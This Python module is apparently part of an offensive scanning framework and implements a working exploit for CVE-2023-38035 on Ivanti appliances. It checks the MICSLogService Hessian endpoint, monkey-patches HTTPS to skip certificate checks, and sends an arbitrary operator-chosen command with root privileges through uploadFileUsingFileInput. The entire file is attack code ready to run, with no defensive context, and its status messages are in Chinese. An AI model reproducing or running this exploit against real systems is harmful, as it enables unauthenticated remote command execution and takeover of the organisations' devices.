from pyhessian.client import HessianProxy
from http.client import HTTPSConnection
import ssl
import requests
import urllib3
from libs.outprint import OutPrintInfo
from libs.reqset import ReqSet

urllib3.disable_warnings()

# Backup original constructor
_original_https_init = HTTPSConnection.__init__


def patched_https_init(self, *args, **kwargs):
    # If context is not provided, use unverified context
    if 'context' not in kwargs:
        kwargs['context'] = ssl._create_unverified_context()
    _original_https_init(self, *args, **kwargs)


class Cve_2023_38035:
    def exploit(self,base_url, command):
        # Define the Hessian service endpoint
        service_url = f"{base_url}/mics/services/MICSLogService"

        r = requests.get(service_url, verify=self.ssl, headers=self.headers,proxies=self.proxy)
        if r.status_code != 405:
            OutPrintInfo("Ivanti",f'目标 {base_url} 不存在漏洞')
            return

            # Monkey-patch the constructor
        HTTPSConnection.__init__ = patched_https_init

        dto = {
            "command": command,
            "isRoot": True,
        }

        # Create a Hessian proxy for the service
        proxy = HessianProxy(service_url)

        # Call a method on the Hessian service:
        details = proxy.uploadFileUsingFileInput(dto, None)
        if details:
            OutPrintInfo("Ivanti",f'[b bright_red]目标 {service_url} 存在漏洞')

    def main(self,target):
        url = target["url"].strip('/ ')
        cmd = target["cmd"]
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        req = ReqSet(header=header, proxy=proxy)
        self.headers = req["header"]
        self.proxy = req["proxy"]


        self.exploit(url, cmd)